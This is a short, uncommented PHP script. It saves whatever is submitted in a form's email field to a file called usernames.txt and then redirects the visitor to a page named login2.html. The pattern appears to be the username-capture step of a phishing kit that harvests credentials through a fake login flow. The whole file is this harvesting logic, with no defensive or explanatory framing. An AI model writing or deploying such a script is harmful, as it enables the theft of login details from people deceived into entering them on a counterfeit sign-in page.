<?php

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: ./login2.html');
exit();
